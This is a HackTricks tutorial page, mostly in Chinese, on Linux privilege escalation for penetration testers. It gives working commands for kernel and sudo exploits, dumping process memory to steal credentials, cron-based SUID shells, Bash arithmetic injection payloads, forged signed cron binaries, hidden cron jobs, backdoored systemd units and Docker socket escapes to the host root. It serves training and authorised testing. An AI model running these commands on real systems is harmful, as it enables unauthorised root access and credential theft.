# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### 操作系统信息

让我们开始收集有关正在运行的操作系统的信息
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你**在 `PATH` 变量中的任意文件夹上具有写权限**，可能能够劫持某些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中是否包含有趣的信息、密码或 API 密钥？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，查看是否存在可用于 escalate privileges 的 exploit
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个不错的有漏洞的内核列表和一些已经 **compiled exploits**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的站点： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有的有漏洞的内核版本，你可以这样做：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可用来搜索 kernel exploits 的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（需在受害主机上执行，仅检查针对 kernel 2.x 的 exploits）

始终 **在 Google 上搜索内核版本**，也许你的内核版本写在某个 kernel exploit 中，这样你就能确定该 exploit 有效。

其他 kernel exploitation 技术：

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于出现在以下位置的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用这个 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

在 1.9.17p1 之前的 Sudo 版本（**1.9.14 - 1.9.17 < 1.9.17p1**）允许非特权本地用户通过 sudo 的 `--chroot` 选项在使用位于用户可控目录的 `/etc/nsswitch.conf` 文件时提升权限到 root。

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB**，了解如何利用此 vuln 的 **示例**
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 枚举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在 docker container 内部，可以尝试从中逃逸：

{{#ref}}
docker-security/
{{#endref}}

## 驱动器

检查 **哪些已挂载和哪些未挂载**、它们在哪里以及为什么。如果有任何未挂载的，你可以尝试将其挂载并检查是否有敏感信息
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

枚举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否安装了 **任何编译器**。如果你需要使用某些 kernel exploit，这很有用，因为建议在你将要使用它的机器上（或在一台类似的机器上）进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查**已安装软件包和服务的版本**。也许存在一些旧的 Nagios 版本（例如）可能会被利用来 escalating privileges…\
建议手动检查较可疑已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有 SSH 访问该机器，你也可以使用 **openVAS** 来检查机器内安装的过时或存在漏洞的软件。

> [!NOTE] > _注意：这些命令会显示大量通常无用的信息，因此建议使用像 OpenVAS 或类似的应用来检查已安装的软件版本是否容易受到已知 exploits 的影响_

## Processes

查看 **哪些进程** 正在被执行，并检查是否有任何进程拥有 **超出其应有的权限**（例如由 root 执行的 tomcat？）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
另外，也要**检查你对进程二进制文件的权限**，也许你可以覆盖别人的文件。

### Process monitoring

你可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监视进程。这对于识别经常被执行或在满足特定条件时运行的易受攻击进程非常有用。

### Process memory

一些服务器服务会把 **凭证以明文保存在内存中**。\
通常你需要 **root privileges** 才能读取属于其他用户的进程内存，因此这通常在你已经是 root 并想发现更多凭证时更有用。\
不过，请记住，**作为常规用户你可以读取你拥有的进程的内存**。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: 所有进程都可以被调试，只要它们拥有相同的 uid。这是 ptrace 传统的工作方式。
> - **kernel.yama.ptrace_scope = 1**: 只有父进程可以被调试。
> - **kernel.yama.ptrace_scope = 2**: 只有管理员可以使用 ptrace，因为它需要 CAP_SYS_PTRACE 能力。
> - **kernel.yama.ptrace_scope = 3**: 不允许使用 ptrace 跟踪任何进程。设置后需要重启才能再次启用 ptrace。

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示了该进程的虚拟地址空间中内存是如何被映射的**；它还显示了**每个映射区域的权限**。**mem** 伪文件 **暴露了进程的内存本身**。从 **maps** 文件我们知道哪些 **内存区域是可读的** 以及它们的偏移量。我们使用这些信息去 **seek into the mem file and dump all readable regions** 到一个文件。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的 **物理**内存的访问，而不是虚拟内存。内核的虚拟地址空间可以使用 /dev/kmem 访问。\
通常，`/dev/mem` 仅可被 **root** 和 kmem 组读取。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump 的 Linux

ProcDump 是对经典 ProcDump 工具的 Linux 重新构想，该工具来自 Sysinternals 的 Windows 工具套件。可在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要 dump 一个 process memory 你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 要求并 dump 由你拥有的 process
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (需要 root)

### 从 Process Memory 获取 Credentials

#### 手动示例

如果你发现 authenticator process 正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump the process（参见前面的章节以找到不同的方法来 dump the memory of a process），并在 memory 中搜索 credentials：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 会从内存和一些已知文件中**窃取明文凭证**。它需要 root 权限才能正常工作。

| 功能                                              | 进程名称             |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 搜索正则/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 计划任务/Cron jobs

### Crontab UI (alseambusher) 以 root 身份运行 – web-based scheduler privesc

如果一个 web “Crontab UI” 面板 (alseambusher/crontab-ui) 以 root 身份运行且仅绑定到 loopback，你仍然可以通过 SSH 本地端口转发访问它并创建一个具有特权的任务以提权。

Typical chain
- 发现仅绑定到 loopback 的端口（例如 127.0.0.1:8000）以及 Basic-Auth 域，通过 `ss -ntlp` / `curl -v localhost:8000`
- 在运维产物中查找凭据：
- 备份/脚本（使用 `zip -P <password>`）
- systemd 单元暴露 `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."`
- 建立隧道并登录:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个 high-priv job 并立即运行（产生 SUID shell）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它：
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- 不要以 root 身份运行 Crontab UI；使用专用用户并赋予最小权限
- 绑定到 localhost，并通过防火墙/VPN 进一步限制访问；不要重复使用密码
- 避免在 unit files 中嵌入 secrets；使用 secret stores 或仅限 root 的 EnvironmentFile
- 为按需作业执行启用 audit/logging



检查是否有任何定时任务存在漏洞。也许你可以利用由 root 执行的脚本（wildcard vuln？可以修改 root 使用的文件？使用 symlinks？在 root 使用的目录中创建特定文件？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例如，在 _/etc/crontab_ 中你可以找到 PATH： _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意到用户 "user" 对 /home/user 具有写权限_)

如果在这个 crontab 中 root 用户尝试在没有设置 path 的情况下执行某个命令或脚本。例如： _\* \* \* \* root overwrite.sh_\
那么，你可以通过使用以下方式获得 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带通配符的脚本 (Wildcard Injection)

如果一个由 root 执行的脚本在某个命令中包含 “**\***”，你可以利用这一点触发意外行为（例如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果通配符前面是像** _**/some/path/\***_ **这样的路径，则它不易受影响（即使** _**./\***_ **也不易受影响）。**

阅读以下页面以获取更多关于通配符利用的小技巧：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 在 ((...))、$((...)) 和 let 中，在算术求值之前会先进行参数扩展和命令替换。如果一个由 root 运行的 cron/parser 从不受信任的日志字段读取数据并将其放入算术上下文中，攻击者可以注入命令替换 $(...)，当 cron 运行时该命令会以 root 身份执行。

- 为什么可行：在 Bash 中，扩展的执行顺序为：参数/变量扩展、命令替换、算术扩展，然后是单词拆分和路径名扩展。因此像 `$(/bin/bash -c 'id > /tmp/pwn')0` 这样的值会先被替换（运行该命令），然后剩下的数字 `0` 用于算术运算，从而使脚本继续而不报错。

- 典型易受攻击的模式：
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 利用方法：让攻击者可控的文本写入被解析的日志，从而使看起来像数字的字段包含命令替换并以数字结尾。确保你的命令不向 stdout 输出（或将其重定向），以便算术运算仍然有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

如果你 **可以修改由 root 执行的 cron script**，你就可以非常容易地获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的 script 使用了一个 **directory（你拥有完全访问权限）**，那么删除该文件夹并 **创建一个指向其他位置的 symlink folder**，指向由你控制的 script，可能会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 自定义签名的 cron 二进制与可写载荷
Blue teams 有时会通过导出自定义 ELF section 并用 grep 查找供应商字符串，然后以 root 身份执行，从而“签名”由 cron 驱动的二进制。如果该二进制对组可写（例如 `/opt/AV/periodic-checks/monitor` 属于 `root:devs 770`）且你可以 leak 签名材料，就可以伪造该 section 并劫持该 cron 任务：

1. 使用 `pspy` 捕获验证流程。在 Era 中，root 运行了 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`，接着运行 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`，然后执行该文件。
2. 使用 leaked key/config（来自 `signing.zip`）重建预期的证书：
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 构建一个恶意替换文件（例如放置 SUID bash、添加你的 SSH key），并把证书嵌入到 `.text_sig`，以使 grep 校验通过：
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 在保留执行位的同时覆盖计划中的二进制：
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 等待下一次 cron 运行；一旦这个简单的签名检查通过，你的 payload 就会以 root 身份运行。

### 常见的 cron 任务

你可以监控进程以查找每 1、2 或 5 分钟执行一次的进程。也许你可以利用它并 escalate privileges。

例如，要 **在 1 分钟内每 0.1s 监控**、**按执行次数最少的命令排序** 并删除执行次数最多的命令，你可以这样做：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（它会监视并列出每个启动的进程）。

### 隐形 cron jobs

可以创建一个 cronjob，方法是**在注释后放置回车**（没有换行字符），并且 cron job 会生效。示例（注意回车字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否可以写入任何 `.service` 文件，如果可以，你 **可以修改它**，使其 **执行** 你的 **backdoor** 当服务 **启动**、**重启** 或 **停止** 时（可能需要等到机器重启）。\  
例如在 `.service` 文件中创建你的 backdoor，使用 **`ExecStart=/tmp/script.sh`**

### 可写的 service 二进制文件

请记住，如果你对**由 service 执行的二进制文件具有写权限**，你可以将它们替换为 backdoors，这样当 service 被重新执行时，backdoors 就会被执行。

### systemd PATH - 相对路径

你可以查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现你可以在该路径的任一文件夹中进行**写入**，你可能能够**提升权限**。你需要搜索服务配置文件中使用**相对路径**的情况，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你有写权限的 systemd PATH 文件夹内创建一个与相对路径二进制同名的可执行文件，当服务被要求执行易受攻击的动作（**Start**、**Stop**、**Reload**）时，你的 **backdoor** 将被执行（非特权用户通常无法启动/停止服务，但检查是否可以使用 `sudo -l`）。

**Learn more about services with `man systemd.service`.**

## **计时器**

**计时器** 是以 `**.timer**` 结尾的 systemd unit 文件，用来控制 `**.service**` 文件或事件。**计时器** 可以作为 cron 的替代方案，因为它们内建对日历时间事件和单调时间事件的支持，并且可以异步运行。

你可以使用以下命令枚举所有计时器：
```bash
systemctl list-timers --all
```
### 可写定时器

如果你可以修改一个定时器，你可以让它执行 systemd.unit 的某些现有单元（比如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中你可以读到 Unit 是什么：

> 要在此定时器到期时激活的 unit。参数是一个 unit 名称，其后缀不是 ".timer"。如果未指定，此值默认为一个与 timer unit 同名的 service，仅后缀不同。（见上文。）建议被激活的 unit 名称与 timer unit 的 unit 名称除后缀外保持一致。

因此，要滥用该权限你需要：

- 找到某个 systemd unit（例如 `.service`）**正在执行一个可写的二进制文件**
- 找到某个 systemd unit **正在执行相对路径**，并且你对 **systemd PATH** 拥有 **可写权限**（以冒充该可执行文件）

**Learn more about timers with `man systemd.timer`.**

### **Enabling Timer**

要启用一个 timer，你需要 root 权限 并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意 **timer** 是通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建符号链接来**激活**的

## Sockets

Unix Domain Sockets (UDS) 支持在客户端-服务器模型中在相同或不同机器之间进行**进程间通信**。它们使用标准 Unix 描述符文件进行计算机间通信，并通过 `.socket` 文件进行设置。

套接字可以使用 `.socket` 文件进行配置。

**有关套接字的更多信息，请参见 `man systemd.socket`。** 在此文件中，可以配置几个有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`：这些选项各不相同，但通常用来**指示将在哪监听**（AF_UNIX 套接字文件的路径、要监听的 IPv4/6 地址和/或端口号等）。
- `Accept`：接受布尔参数。如果 **true**，则为每个传入连接生成一个 service instance，并且只将连接套接字传递给它。如果 **false**，所有监听套接字本身将被**传递给启动的 service unit**，并且只为所有连接生成一个 service unit。该值对 datagram sockets 和 FIFOs 被忽略，在这些情况下单个 service unit 无条件处理所有传入流量。**默认值为 false**。出于性能原因，建议以适合 `Accept=no` 的方式编写新的守护进程。
- `ExecStartPre`, `ExecStartPost`：接受一条或多条命令行，用于在监听的 sockets/FIFOs 被分别**创建**并绑定之前或之后**执行**。命令行的第一个标记必须是绝对文件名，之后为该进程的参数。
- `ExecStopPre`, `ExecStopPost`：额外的命令，在监听的 sockets/FIFOs 被分别**关闭**和移除之前或之后**执行**。
- `Service`：指定在有传入流量时**激活**的 **service** unit 名称。该设置仅允许用于 Accept=no 的 sockets。其默认值为与 socket 同名的 service（后缀替换）。在大多数情况下，不需要使用此选项。

### Writable .socket files

如果你发现一个**可写**的 `.socket` 文件，你可以在 `[Socket]` 节的开头添加类似 `ExecStartPre=/home/kali/sys/backdoor` 的条目，backdoor 将在 socket 创建之前被执行。因此，你**很可能需要等到机器重启。**  
_注意系统必须正在使用该 socket 文件的配置，否则 backdoor 不会被执行_

### Writable sockets

如果你**发现任何可写的 socket**（_这里我们说的是 Unix Sockets，而不是配置 `.socket` 文件_），那么你可以与该 socket **通信**，并可能 exploit 某个漏洞。

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意，可能存在一些 **sockets listening for HTTP** 请求（_我不是在说 .socket 文件，而是那些作为 unix sockets 的文件_）。你可以用下面的命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **responds with an HTTP** request, then you can **communicate** with it and maybe **exploit some vulnerability**.

### 可写 Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个容器，从而以 root 级别访问主机的文件系统。

#### **直接使用 Docker API**

在 Docker CLI 不可用的情况下，仍然可以使用 Docker API 和 `curl` 命令操作 Docker socket。

1.  **列出 Docker 镜像：** 检索可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **创建容器：** 发送请求以创建一个将主机根目录挂载进去的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **附加到容器：** 使用 `socat` 建立与容器的连接，从而可以在其中执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

建立 `socat` 连接后，你可以在容器中直接执行命令，并以 root 级别访问主机文件系统。

### 其他

请注意，如果你对 docker socket 有写权限（因为你**inside the group `docker`**），你将有[**更多方式来提升权限**](interesting-groups-linux-pe/index.html#docker-group)。如果[**docker API 在某个端口监听**，你也可能能够攻破它](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下位置查看**更多从 docker 逃逸或滥用其以提升权限的方法**：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 提权

如果发现你可以使用 **`ctr`** 命令，请阅读以下页面，因为**你可能能滥用它来提升权限**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 提权

如果发现你可以使用 **`runc`** 命令，请阅读以下页面，因为**你可能能滥用它来提升权限**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的 **inter-Process Communication (IPC) system**，使得应用能够高效地交互和共享数据。它面向现代 Linux 系统设计，为不同形式的应用通信提供了稳健的框架。

该系统功能多样，支持增强进程间数据交换的基本 IPC，类似于 **enhanced UNIX domain sockets**。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自 Bluetooth daemon 的来电信号可以促使音乐播放器静音，从而提升用户体验。D-Bus 还支持远程对象系统，简化应用间的服务请求和方法调用，简化了传统上复杂的流程。

D-Bus 基于 **allow/deny model** 运行，根据匹配策略规则的累积效果来管理消息权限（方法调用、信号发送等）。这些策略指定了与 bus 的交互，可能通过利用这些权限实现提权。

下面给出了 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中此类策略的示例，说明 root 用户对于 `fi.w1.wpa_supplicant1` 的拥有、发送和接收消息的权限。

未指定用户或组的策略适用于所有对象，而 “default” 上下文策略适用于未被其他特定策略覆盖的所有对象。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在此处了解如何 enumerate 并 exploit D-Bus 通信：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

通常有趣的是 enumerate 网络并弄清这台机器在网络中的位置。

### 通用 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

始终检查在访问该机器之前你无法与之交互的正在运行的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查是否可以 sniff 流量。如果可以，你可能能够抓取一些 credentials。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查 **你** 是谁，拥有哪些 **权限**，系统中有哪些 **用户**，哪些可以 **登录** 以及哪些具有 **root 权限**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
